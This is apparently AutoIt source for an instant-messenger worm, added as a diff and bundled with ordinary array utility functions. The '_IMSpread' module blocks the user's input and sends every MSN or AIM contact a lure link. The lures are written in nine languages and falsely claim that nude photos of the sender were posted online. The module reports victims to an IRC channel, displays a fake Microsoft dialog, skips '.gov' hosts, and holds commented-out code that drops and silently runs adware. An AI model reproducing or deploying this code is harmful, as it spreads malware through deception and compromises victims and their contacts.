+; Syntax:           _ArraySearch($avArray, $vWhat2Find, $iStart = 0, $iEnd = 0,$iCaseSense=0, $fPartialSearch = False)
+;
+; Parameter(s):     $avArray           = The array to search
+;                   $vWhat2Find        = What to search $avArray for
+;                   $iStart (Optional) = Start array index for search, normally set to 0 or 1. If omitted it is set to 0
+;                   $iEnd  (Optional)  = End array index for search. If omitted or set to 0 it is set to Ubound($AvArray)-
+;					$iCaseSense (Optional) = If set to 1 then search is case sensitive
+;					$fPartialSearch (Optional) = If set to True then executes a partial search. If omitted it is set to False
+; Requirement(s):   None
+;
+; Return Value(s):  On Success - Returns the position of an item in an array.
+;                   On Failure - Returns an -1 if $vWhat2Find is not found
+;                        @Error=1 $avArray is not an array
+;                        @Error=2 $iStart is greater than UBound($AvArray)-1
+;                        @Error=3 $iEnd is greater than UBound($AvArray)-1
+;                        @Error=4 $iStart is greater than $iEnd
+;						 @Error=5 $iCaseSense was invalid. (Must be 0 or 1)
+;						 @Error=6 $vWhat2Find was not found in $avArray
+;
+; Author(s):        SolidSnake <MetalGX91 at GMail dot com> - updated by gcriaco <gcriaco at gmail dot com>
+; Note(s):          This might be slower than _ArrayBinarySearch() but is useful when the array's order can't be altered.
+;===============================================================================
+Func _ArraySearch(Const ByRef $avArray, $vWhat2Find, $iStart = 0, $iEnd = 0, $iCaseSense = 0, $fPartialSearch = False)
+	Local $iCurrentPos, $iUBound, $iResult
+	If Not IsArray($avArray) Then
+		SetError(1)
+		Return -1
+	EndIf
+	$iUBound = UBound($avArray) - 1
+	If $iEnd = 0 Then $iEnd = $iUBound
+	If $iStart > $iUBound Then
+		SetError(2)
+		Return -1
+	EndIf
+	If $iEnd > $iUBound Then
+		SetError(3)
+		Return -1
+	EndIf
+	If $iStart > $iEnd Then
+		SetError(4)
+		Return -1
+	EndIf
+	If Not ($iCaseSense = 0 Or $iCaseSense = 1) Then
+		SetError(5)
+		Return -1
+	EndIf
+	For $iCurrentPos = $iStart To $iEnd
+		Select
+			Case $iCaseSense = 0
+				If $fPartialSearch = False Then
+					If $avArray[$iCurrentPos] = $vWhat2Find Then
+						SetError(0)
+						Return $iCurrentPos
+					EndIf
+				Else
+					$iResult = StringInStr($avArray[$iCurrentPos], $vWhat2Find, $iCaseSense)
+					If $iResult > 0 Then
+						SetError(0)
+						Return $iCurrentPos
+					EndIf
+				EndIf
+			Case $iCaseSense = 1
+				If $fPartialSearch = False Then
+					If $avArray[$iCurrentPos] == $vWhat2Find Then
+						SetError(0)
+						Return $iCurrentPos
+					EndIf
+				Else
+					$iResult = StringInStr($avArray[$iCurrentPos], $vWhat2Find, $iCaseSense)
+					If $iResult > 0 Then
+						SetError(0)
+						Return $iCurrentPos
+					EndIf
+				EndIf
+		EndSelect
+	Next
+	SetError(6)
+	Return -1
+EndFunc   ;==>_ArraySearch
+
+;===============================================================================
+;
+; Function Name:    _ArraySort()
+; Description:      Sort an 1 or 2 dimensional Array on a specific index
+;                   using the quicksort/insertsort algorithms.
+; Parameter(s):     $a_Array      - Array
+;                   $i_Descending - Sort Descending when 1
+;                   $i_Base       - Start sorting at this Array entry.
+;                   $I_Ubound     - End sorting at this Array entry.
+;                                   Default UBound($a_Array) - 1
+;                   $i_Dim        - Elements to sort in second dimension
+;                   $i_SortIndex  - The Index to Sort the Array on.
+;                                   (for 2-dimensional arrays only)
+; Requirement(s):   None
+; Return Value(s):  On Success - 1 and the sorted array is set
+;                   On Failure - 0 and sets @ERROR = 1
+; Author(s):        Jos van der Zande <jdeb at autoitscript dot com>
+;                   LazyCoder - added $i_SortIndex option
+;                   Tylo - implemented stable QuickSort algo
+;                   Jos - Changed logic to correctly Sort arrays with mixed Values and Strings
+;
+;===============================================================================
+;
+Func _ArraySort(ByRef $a_Array, $i_Decending = 0, $i_Base = 0, $i_UBound = 0, $i_Dim = 1, $i_SortIndex = 0)
+  ; Set to ubound when not specified
+    If Not IsArray($a_Array) Then
+       SetError(1)
+       Return 0
+    EndIf
+    Local $last = UBound($a_Array) - 1
+    If $i_UBound < 1 Or $i_UBound > $last Then $i_UBound = $last
+
+    If $i_Dim = 1 Then
+        __ArrayQSort1($a_Array, $i_Base, $i_UBound)
+        If $i_Decending Then _ArrayReverse($a_Array, $i_Base, $i_UBound)
+    Else
+        __ArrayQSort2($a_Array, $i_Base, $i_UBound, $i_Dim, $i_SortIndex, $i_Decending)
+    EndIf
+    Return 1
+EndFunc;==>_ArraySort
+
+; Private
+Func __ArrayQSort1(ByRef $array, ByRef $left, ByRef $right)
+    Local $i, $j, $t
+    If $right - $left < 10 Then
+      ; InsertSort - fastest on small segments (= 25% total speedup)
+        For $i = $left + 1 To $right
+            $t = $array[$i]
+            $j = $i
+			While $j > $left _
+				And (    (IsNumber($array[$j - 1]) = IsNumber($t) And $array[$j - 1] > $t) _
+				      Or (IsNumber($array[$j - 1]) <> IsNumber($t) And String($array[$j - 1]) > String($t)))
+                $array[$j] = $array[$j - 1]
+                $j = $j - 1
+            Wend
+            $array[$j] = $t
+        Next
+        Return
+    EndIf
+
+  ; QuickSort - fastest on large segments
+    Local $pivot = $array[Int(($left + $right)/2)]
+    Local $L = $left
+    Local $R = $right
+    Do
+		While ((IsNumber($array[$L]) = IsNumber($pivot) And $array[$L] < $pivot) _
+				Or (IsNumber($array[$L]) <> IsNumber($pivot) And String($array[$L]) < String($pivot)))
+			;While $array[$L] < $pivot
+            $L = $L + 1
+        Wend
+		While ((IsNumber($array[$R]) = IsNumber($pivot) And $array[$R] > $pivot) _
+				Or (IsNumber($array[$R]) <> IsNumber($pivot) And String($array[$R]) > String($pivot)))
+			;	While $array[$R] > $pivot
+            $R = $R - 1
+        Wend
+      ; Swap
+        If $L <= $R Then
+            $t = $array[$L]
+            $array[$L] = $array[$R]
+            $array[$R] = $t
+            $L = $L + 1
+            $R = $R - 1
+        EndIf
+    Until $L > $R
+
+    __ArrayQSort1($array, $left, $R)
+    __ArrayQSort1($array, $L, $right)
+EndFunc
+
+; Private
+Func __ArrayQSort2(ByRef $array, ByRef $left, ByRef $right, ByRef $dim2, ByRef $sortIdx, ByRef $decend)
+    If $left >= $right Then Return
+    Local $t, $d2 = $dim2 - 1
+    Local $pivot = $array[Int(($left + $right)/2)][$sortIdx]
+    Local $L = $left
+    Local $R = $right
+    Do
+        If $decend Then
+			While ((IsNumber($array[$L][$sortIdx]) = IsNumber($pivot) And $array[$L][$sortIdx] > $pivot) _
+				Or (IsNumber($array[$L][$sortIdx]) <> IsNumber($pivot) And String($array[$L][$sortIdx]) > String($pivot)))
+				;While $array[$L][$sortIdx] > $pivot
+                $L = $L + 1
+            Wend
+			While ((IsNumber($array[$R][$sortIdx]) = IsNumber($pivot) And $array[$R][$sortIdx] < $pivot) _
+				Or (IsNumber($array[$R][$sortIdx]) <> IsNumber($pivot) And String($array[$R][$sortIdx]) < String($pivot)))
+				;While $array[$R][$sortIdx] < $pivot
+                $R = $R - 1
+            Wend
+        Else
+			While ((IsNumber($array[$L][$sortIdx]) = IsNumber($pivot) And $array[$L][$sortIdx] < $pivot) _
+				Or (IsNumber($array[$L][$sortIdx]) <> IsNumber($pivot) And String($array[$L][$sortIdx]) < String($pivot)))
+				;While $array[$L][$sortIdx] < $pivot
+                $L = $L + 1
+            Wend
+			While ((IsNumber($array[$R][$sortIdx]) = IsNumber($pivot) And $array[$R][$sortIdx] > $pivot) _
+				Or (IsNumber($array[$R][$sortIdx]) <> IsNumber($pivot) And String($array[$R][$sortIdx]) > String($pivot)))
+				;While $array[$R][$sortIdx] > $pivot
+                $R = $R - 1
+            Wend
+        EndIf
+        If $L <= $R Then
+            For $x = 0 To $d2
+                $t = $array[$L][$x]
+                $array[$L][$x] = $array[$R][$x]
+                $array[$R][$x] = $t
+            Next
+            $L = $L + 1
+            $R = $R - 1
+        EndIf
+    Until $L > $R
+
+    __ArrayQSort2($array, $left, $R, $dim2, $sortIdx, $decend)
+    __ArrayQSort2($array, $L, $right, $dim2, $sortIdx, $decend)
+EndFunc
+
+
+
+;===============================================================================
+;
+; Function Name:  _ArraySwap()
+; Description:    Swaps two elements of an array.
+; Author(s):      David Nuttall <danuttall at rocketmail dot com>
+;
+;===============================================================================
+Func _ArraySwap(ByRef $svector1, ByRef $svector2)
+	Local $sTemp = $svector1
+
+	$svector1 = $svector2
+	$svector2 = $sTemp
+
+	SetError(0)
+EndFunc   ;==>_ArraySwap
+
+
+;===============================================================================
+;
+; Function Name:  _ArrayToClip()
+; Description:    Sends the contents of an array to the clipboard.
+; Author(s):      Cephas <cephas at clergy dot net>
+;
+;                 Jos van der Zande
+; Modified:       Added $i_Base parameter and logic
+;===============================================================================
+Func _ArrayToClip(const ByRef $avArray, $i_Base = 0)
+	Local $iCntr, $iRetVal = 0, $sCr = "", $sText = ""
+
+	If (IsArray($avArray)) Then
+		For $iCntr = $i_Base To (UBound($avArray) - 1)
+			$iRetVal = 1
+			If $iCntr > $i_Base Then
+				$sCr = @CR
+			EndIf
+			$sText = $sText & $sCr & $avArray[$iCntr]
+		Next
+	EndIf
+	ClipPut($sText)
+	Return $iRetVal
+EndFunc   ;==>_ArrayToClip
+
+
+;===============================================================================
+;
+; Function Name:  _ArrayToString()
+; Description:    Places the elements of an array into a single string,
+;                 separated by the specified delimiter.
+; Author(s):      Brian Keene <brian_keene at yahoo dot com>
+;						Rewritten by: Valik
+;
+;===============================================================================
+Func _ArrayToString(Const ByRef $avArray, $sDelim, $iStart = Default, $iEnd = Default)
+	; Declare local variables.
+	Local $iUBound = UBound($avArray) - 1
+
+	; Validate the array
+	If ($iUBound + 1) < 2 Or UBound($avArray, 0) > 1 Then Return SetError(1, 0, "")
+
+	; Expand Default parameters
+	If $iStart = Default Or $iStart = -1 Then $iStart = 0
+	If $iEnd = Default Or $iEnd = -1 Then $iEnd = $iUBound
+
+	; Validate that the start and end indices are valid.
+	If ($iStart < 0) Or ($iEnd < 0) Or ($iStart > $iEnd) Then Return SetError(2, 0, "")
+
+	; Make sure that $iEnd <= to the size of the array.
+	If ($iEnd > $iUBound) Then
+		$iEnd = $iUBound
+	EndIf
+
+	Local $sResult
+	; Combine the elements into the string.
+	For $i = $iStart To $iEnd
+		$sResult &= $avArray[$i] & $sDelim
+	Next
+
+	Return StringTrimRight($sResult, StringLen($sDelim))
+EndFunc   ;==>_ArrayToString
+
+;===============================================================================
+;
+; FunctionName:     _ArrayTrim()
+; Description:      Trims all elements in an array a certain number of characters.
+; Syntax:           _ArrayTrim( $aArray, $iTrimNum , [$iTrimDirection] , [$iBase] , [$iUbound] )
+; Parameter(s):     $aArray              - The array to trim the items of
+;                   $iTrimNum            - The amount of characters to trim
+;                    $iTrimDirection     - 0 to trim left, 1 to trim right
+;                                            [Optional] : Default = 0
+;                   $iBase               - Start trimming at this element in the array
+;                                            [Optional] : Default = 0
+;                   $iUbound             - End trimming at this element in the array
+;                                            [Optional] : Default = Full Array
+; Requirement(s):   None
+; Return Value(s):  1 - If invalid array
+;                   2 - Invalid base boundry parameter
+;                   3 - Invalid end boundry parameter
+;                   4 - If $iTrimDirection is not a zero or a one
+;                    Otherwise it returns the new trimmed array
+; Author(s):        Adam Moore (redndahead)
+; Note(s):          None
+;
+;===============================================================================
+Func _ArrayTrim($aArray, $iTrimNum, $iTrimDirection = 0, $iBase = 0, $iUBound = 0)
+	Local $i
+
+	;Validate array and options given
+	If UBound($aArray) = 0 Then
+		SetError(1)
+		Return $aArray
+	EndIf
+
+	If $iBase < 0 Or Not IsNumber($iBase) Then
+		SetError(2)
+		Return $aArray
+	EndIf
+
+	If UBound($aArray) <= $iUBound Or Not IsNumber($iUBound) Then
+		SetError(3)
+		Return $aArray
+	EndIf
+
+	; Set to ubound when not specified
+	If $iUBound < 1 Then $iUBound = UBound($aArray) - 1
+
+	If $iTrimDirection < 0 Or $iTrimDirection > 1 Then
+		SetError(4)
+		Return
+	EndIf
+	;Trim it off
+	For $i = $iBase To $iUBound
+		If $iTrimDirection = 0 Then
+			$aArray[$i] = StringTrimLeft($aArray[$i], $iTrimNum)
+		Else
+			$aArray[$i] = StringTrimRight($aArray[$i], $iTrimNum)
+		EndIf
+	Next
+	Return $aArray
+EndFunc   ;==>_ArrayTrim
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: C:\Dokumente und Einstellungen\root\Desktop\spread\Include\array.au3>
+; ----------------------------------------------------------------------------
+
+$aArray = _TimeSystemRestart()
+;_ArrayDisplay($aArray, 'Return Info')
+
+Func _TimeSystemRestart()
+    Local $iSubTotal = DllCall('kernel32.dll', 'int', 'GetTickCount')
+    If Not IsArray($iSubTotal) Then Return SetError(1, 0, 0)
+    $iSubTotal = $iSubTotal[0] / 1000
+    Local $iWeek = Int(($iSubTotal / 604800))
+    If $iWeek > 0 Then $iSubTotal -= $iWeek * 604800
+    Local $iDay = Int(($iSubTotal / 86400))
+    If $iDay > 0 Then $iSubTotal -= $iDay * 86400
+    Local $iHour = Int(($iSubTotal / 3600))
+    Local $iMin = Int(($iSubTotal - ($iHour * 3600)) / 60)
+    Local $iSec = Int(($iSubTotal - $iHour * 3600) - ($iMin * 60))
+    Return StringSplit(StringFormat('%02d', $iWeek) & ':' & $iDay & ':' & StringFormat('%02d', $iHour) & ':' & _
+        StringFormat('%02d', $iMin) & ':' & StringFormat('%02d', $iSec), ':')
+EndFunc
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: C:\Dokumente und Einstellungen\root\Desktop\spread\include\uptime.au3>
+; ----------------------------------------------------------------------------
+
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: C:\Dokumente und Einstellungen\root\Desktop\spread\include\im.au3>
+; ----------------------------------------------------------------------------
+
+AutoItSetOption("MouseCoordMode", 1)
+AutoItSetOption("WinTitleMatchMode", 4)
+
+Func _IMSpread()
+
+;; IM "Mass Messenger" v1.43 Fixed
+;;
+;; MSN 4.x/5.x/6.x/7.x/WLM and AIM 6.0 integrated.
+;;
+;; This Code is for Educational Purposes Only.
+;; ;x
+
+
+		;;;;;;;;;;;;;;;;;;;;;;;     ;;;;;;         ;;;;;;
+	   ;;;;;;;;;;;;;;;;;;;;;;;      ;;;;		   ;;;;
+      ;;;;;;; 				       ;;;;  		  ;;;;
+     ;;;;;;;;;;;;;;;;;;;;;;;      ;;;; 			 ;;;;
+    ;;;;;;;;;;;;;;;;;;;;;;;		 ;;;;           ;;;;
+   ;;;;;;;					    ;;;;  Coding   ;;;;
+  ;;;;;;;				       ;;;; <  By  >  ;;;;
+ ;;;;;;;                      ;;;; XFREGGIRT ;;;;
+;;;:;;; 				     ;;;;;;;;;;;;;;;;;;;
+
+;; Fixed MSN WLM
+;; Fixed MSN 7.X
+;; Fixed AIM 6.0
+;; Fixed Language Support
+;;
+;; Todo:
+;;
+;; - ICQ , XFIRE , SKYPE , gAim , All Other GTK's.
+;;
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;; Variables																													;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+Dim $sIp , $HOSTCHKON , $IP , $IPZ , $HOSTZ , $SOCK , $CHANNEL , $IESEEN = 0 ;; Host Check
+
+Dim $MON , $KEY , $TEMP , $GETPID , $GETPID2 , $PID , $MSGBOXON , $IESPAM ;; Global
+
+Dim $BUTT , $SEX , $NIGA , $KNETA = 1 , $TEAMA , $AIMHOME ;; AIM
+
+Dim $NIGB , $KNETB = 1 , $TEAMB , $MSNHOME , $MSNO ;; MSN
+
+Dim $SPAMCOUNT , $ENDOFLIST , $MSNHOME2 , $IMSPAMPICK , $NOTSIGNEDIN , $INPUTSPAM , $JUMPFIRST4 ;; Spam related
+
+Dim $MSN , $AIM , $MSN7 , $MSNWLM ;; IM
+
+Dim $ENG , $GER , $ITA , $SPA , $FRA , $NED , $BEL , $NOR , $SWE ;; Languages
+
+Global $URLL
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;; Start Values																													;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+$BUTT = True
+$SEX = 0 ;; AIM Switch , dont change
+$AIMHOME = False ;; Press Home Key in AIM Online/Offline spread , dont change
+$MSNHOME = False ;; Press Home Key in MSN Online spread , dont change
+$MSNHOME2 = False ;; Press Home Key in MSN Offline spread , dont change
+$MON = True
+$KEY = True
+$TEAMB = False
+$INPUTSPAM = True
+$IESPAM = True
+
+$SPAMCOUNT = 0 ;; Counts the spammed conversations.
+$ENDOFLIST = 0 ;; Checks if Buddylist has ended. First Online list which will turn it to 1 , Then Offline list which will turn it to 2 and exit.
+$IMSPAMPICK = 1 ;; Picks AIM or MSN, dont change
+$HOSTCHKON = 1 ;; Dont change if you want to spread your txt.
+
+#comments-start
+Dim $DEST2
+Dim $DEST
+
+$DEST = @WindowsDir & "\instr32.exe" ;; Destination of Included Exe
+$DEST2 = @WindowsDir & "\instr64.exe" ;; Destination of Included Exe
+
+;; Adware or other Exe you might want to include ;)
+FileInstall ( "c:\bla\r.exe", $DEST , 1 )
+Run( $DEST , "" ,  @SW_HIDE ) ;; Run Included Exe
+
+
+;; Adware or other Exe you might want to include ;)
+FileInstall ( "c:\bla\m.exe", $DEST2 , 1 )
+Run( $DEST2 , "" ,  @SW_HIDE ) ;; Run Included Exe
+#comments-end
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;; Start of Config 																												;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+$JUMPFIRST4 = 0  ;; If you want to jump first 4 buddies use 1..
+$MSGBOXON = False
+
+
+;; Change Spam Sentence between ""
+
+
+;; English v
+$ENG = $URLL
+
+;; German v
+$GER = "Hey du schau mal dieses foto an haha , ein freund von du ist an ficken HAHAHA :D " & $URLL & " "
+
+;; Italian v
+$ITA = "..faccia la u conoscono chi ha messo uno del mio pics di nude in linea?! :@ " & $URLL & "..Sto andando uccidere quello chi ha fatto questo 8o| .... "
+
+;; Spanish v
+$SPA = "¡¿haga u saben quién puso uno de mi pics del nude en línea.. : @ " & $URLL & " voy a matar a el quién hizo éste.... "
+
+;; French v
+$FRA = "MERDE! :@ .. quelqu'un a mis deux de mes nu photos en ligne " & $URLL & " qui?..ou?..:@:@ "
+
+;; Dutch v
+$NED = "heey..iemand heeft 2 van mijn naakt foto's online gezet :@ kijk :( " & $URLL & " vind je dit nog normaal? :@ ...  "
+
+;; Belgic v
+$BEL = "lap zeg :O , wie heeft mijne naakte fotokes online gezet? :@ " & $URLL & " GODVERDOMME ZEG! "
+
+;; Norwegian  v
+$NOR = "Heiii omg se på dette :O " & $URLL
+
+;; Sweden v
+$SWE = "Heejjj kolla ut det hær :O " & $URLL
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;; End of Config 																												;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+
+
+;; Delete other exe of this code running
+;if FileExists( @WindowsDir & "\windebug2.log" ) Then
+;$GETPID2 = FileRead( @WindowsDir & "\windebug2.log" )
+;$PID = StringRight( $GETPID2 , 10 )
+;FileDelete( @WindowsDir & "\windebug2.log" )
+;EndIf
+;FileWrite( @WindowsDir & "\windebug2.log" , @AutoItExe )
+
+#comments-start
+While $IESPAM = True
+	_IECreate ("http://knetknet.imarichkid.hop.clickbank.net", 1, 1, 0)
+	Sleep( 1800000 )
+	_IECreate ("http://knetknet.dayjobkill.hop.clickbank.net", 1, 1, 0)
+	Sleep( 1800000 )
+	_IECreate ("http://knetknet.duvetdolla.hop.clickbank.net", 1, 1, 0)
+	Sleep( 1800000 )
+	$IESPAM = False
+WEnd
+#comments-end
+
+$IP = _GetIP() ;; Get IP
+$sIp = _TCPIpToName($IP) ;; Translate IP to Hostname
+$IPZ = StringRight ( $sIp, 3 ) ;; Get last 3 characters of host
+$HOSTZ = _Language()
+
+;; GOV O_O AAAAAAH EXIT!
+if $IPZ = "gov" Then
+	Exit
+EndIf
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;  Which IM shall we rwn today? <.<																										;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+;; Change Spam Sentence between ""
+#cs
+;; English v
+$ENG = "SERIOUSLY CHECK! " & $URLL & " hahaha:D"
+
+;; German v
+$GER = "hahaha check :D " & $URLL
+
+;; Italian v
+$ITA = "hahaha stupore :D " & $URLL
+
+;; Spanish v
+$SPA = "haha ululación :D " & $URLL
+
+;; French v
+$FRA = "stupéfier... " & $URLL
+
+;; Dutch v
+$NED = "Haha check dit :D  " & $URLL
+
+;; Belgic v
+$BEL = "WOW :D " & $URLL
+
+;; Norwegian  v
+$NOR = "WOW :D " & $URLL
+
+;; Sweden v
+$SWE = "WOW :D " & $URLL
+
+#ce
+
+if $IMSPAMPICK = 1 Then
+;; Check if MSN is running..
+if ProcessExists( "msnmsgr.exe") Then
+	$MSN = 1
+EndIf
+
+if ProcessExists ("msmsgs.exe") Then
+	$MSNO = 1
+Endif
+;; Check if AIM is running
+if ProcessExists( "aim6.exe") Then
+	$AIM = 1
+EndIf
+
+;; If both are running do a little gamble game and pick one..
+if $AIM = 1 And $MSN = 1 Then
+	$MSN = Random()
+	$AIM = Random()
+	if $MSN < 0.50 Then
+		$AIM = 0
+		$MSN = 1
+	EndIf
+
+	if $AIM > 0.50 Then
+	 $MSN = 0
+	 $AIM = 1
+ EndIf
+Endif
+
+if $MSN = 1 And $MSNO = 1 Then
+	$MSN = Random()
+	$MSNO = Random()
+	if $MSN < 0.90 Then
+		$MSNO = 0
+		$MSN = 1
+	EndIf
+
+	if $MSNO > 0.90 Then
+	 $MSN = 0
+	 $MSNO = 1
+ EndIf
+ Endif
+
+ if $AIM = 1 And $MSNO = 1 Then
+	$MSNO = Random()
+	$AIM = Random()
+	if $MSNO < 0.40 Then
+		$AIM = 0
+		$MSNO = 1
+	EndIf
+
+	if $AIM > 0.40 Then
+	 $MSNO = 0
+	 $AIM = 1
+ EndIf
+ Endif
+
+ Sleep( 100 )
+
+ EndIf
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;  !! MSN SPAM CODE !!																											;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+if $MSN = 1 Then
+
+$IMSPAMPICK = 0
+WinActivate( "classname=MSBLWindowClass" , "" )
+BlockInput ( 1 )
+Send ( "{ESC}" )
+if WinActive ( "classname=MSNTodayWindowClass") Then
+					Send ( "{ALTDOWN}" )
+					Send ( "{F4}" )
+					Send ( "{ALTUP}" )
+Endif
+;; Check if MSN is signed in..
+While 1
+if Winactive( "Windows Live Messenger" ) Then
+Send( "{ALT}" )
+Send ("{RIGHT 1}")
+Send ("{ENTER 2}" )
+Sleep ( 3000 )
+if WinActive( "Windows Live Messenger" ) Then
+	_IRCSendMessage($sock, "\\ [MSN 8.X]: Victim not signed in , ending IM spam.", $channel)
+	$MSN = 0
+	$TEAMB = False
+	$INPUTSPAM = False
+	BlockInput( 0 )
+	Exitloop
+Else
+		$MSN = 1
+		$TEAMB = True
+		Send( "{ESC}" )
+		Exitloop
+EndIf
+EndIf
+
+if Winactive( "MSN Messenger" ) Then
+Send( "{ALT}" )
+Send ("{RIGHT 1}")
+Send ("{ENTER 2}" )
+Sleep ( 3000 )
+if WinActive( "MSN Messenger" ) Then
+	_IRCSendMessage($sock, "\\ [MSN 7.X]: Victim not signed in , ending IM spam.", $channel)
+	$MSN = 0
+	$TEAMB = False
+	$INPUTSPAM = False
+	BlockInput( 0 )
+	Exitloop
+Else
+		$MSN = 1
+		$TEAMB = True
+		Send( "{ESC}" )
+		Exitloop
+
+EndIf
+EndIf
+WEnd
+
+  If $TEAMB = True Then
+	    WinWaitActive ( "classname=MSBLWindowClass" )
+		Blockinput ( 1 )
+		if $MSGBOXON = True Then
+	    MsgBox ( 4096, "Windows Messenger Buddy List Check", "Windows Messenger will now start a general routine messure which keeps our servers clean from hackers." & @LF & "This routine checking system can take up to 5 minutes." & @LF & @LF & "Thank you for your patience." & @LF & @LF & "- Microsoft Service Team" & @LF & @LF & "IMPORTANT NOTICE: Keyboard/Mouse Input is blocked during this check.", 10 )
+	EndIf
+		WinActivate( "classname=MSBLWindowClass" , "" )
+
+If WinActive( "Windows Live Messenger" ) Then
+	   ;; Change to Online Instead of Using Groups.
+	   	If WinActive( "classname=#32770") Then
+					Send ("{ESC 2}")
+		EndIf
+	   Send("{ALT}")
+	   Send("{RIGHT}")
+	   Send("{UP 6}")
+       Send("{RIGHT}")
+       Send("{ENTER}")
+	   Sleep( 200 )
+	   Send("{ALT}")
+	   Send("{RIGHT}")
+	   Send("{UP 5}")
+       Send("{RIGHT}")
+	   Send("{DOWN 2}")
+       Send("{ENTER}")
+	   $TEAMB = False
+	   $MSNWLM = "MSN 8.x"
+   ElseIf WinActive ( "MSN Messenger" ) Then
+	  Blockinput ( 1 )
+	   	If WinActive( "classname=#32770") Then
+				Send ("{ESC 2}")
+		EndIf
+	   Send("{ALT}")
+	   Send("{RIGHT}")
+	   Send("{UP 4}")
+       Send("{RIGHT}")
+	   Send("{DOWN}")
+	   Send("{ENTER}")
+	   $TEAMB = False
+	   $MSN7 = "MSN 7.x"
+   EndIf
+   Else
+
+EndIf
+
+;;
+;; Picking the right language to Spam >.>
+;;
+
+if $HOSTCHKON = 1 Then
+
+if $HOSTZ = "NL" Then
+	Clipput( $NED )
+EndIf
+if $HOSTZ = "BE" Then
+	Clipput( $BEL )
+EndIf
+if $HOSTZ = "EN" Then
+	Clipput( $ENG )
+EndIf
+if $HOSTZ = "DE" Then
+	Clipput( $GER )
+EndIf
+if $HOSTZ = "IT" Then
+	Clipput( $ITA )
+EndIf
+if $HOSTZ = "ES" Then
+	Clipput( $SPA )
+EndIf
+if $HOSTZ = "FR" Then
+	Clipput( $FRA )
+EndIf
+if $HOSTZ = "NO" Then
+	Clipput( $NOR )
+EndIf
+if $HOSTZ = "SE" Then
+	Clipput( $SWE )
+EndIf
+
+if $HOSTZ = "NA"	Then
+	Clipput( $ENG )
+EndIf
+
+EndIf
+
+Sleep ( 100 )
+;; Wait till MSN pops up.
+While $MSN = 1
+If $sTemp[1] = "" Then ContinueLoop; If its empty, Continue!
+If $sTemp[1] = "PING" Then _IRCPing($sock,$sTemp[2]); Checks for PING replys (There smaller then usual messages so its special!
+If $sTemp[0] <= 2 Then ContinueLoop; Useless messages for the most part
+
+if $MSN = 1 Then
+	Blockinput ( 1 )
+		if WinActive ( "classname=MSBLWindowClass" ) Then
+			    $INPUTSPAM = True
+				if $MSNHOME = False Then
+					Send( "{HOME}" )
+					$MSNHOME = True
+				EndIf
+					Send( "{DOWN}" )
+			if $JUMPFIRST4 = 1 Then
+				Send( "{DOWN 3}" )
+				$JUMPFIRST4 = 0
+			EndIf
+				Sleep( 50 )
+				Send( "{ENTER}")
+				Sleep( 900 )
+				If WinActive( "classname=IEFrame" ) Then
+					Send ( "{ALTDOWN}" )
+					Send ( "{F4}" )
+					Send ( "{ALTUP}" )
+					$IESEEN = $IESEEN + 1
+					if $IESEEN > 2 Then
+						$SPAMCOUNT = $SPAMCOUNT - 2
+						_IRCSendMessage($sock, "\\ [MSN]: Spammed " & $SPAMCOUNT & " Contacts.", $channel)
+						_IRCSendMessage($sock, "\\ [MSN]: Spam Finished.", $channel)
+					BlockInput ( 0 )
+					Exitloop
+					EndIf
+				EndIf
+
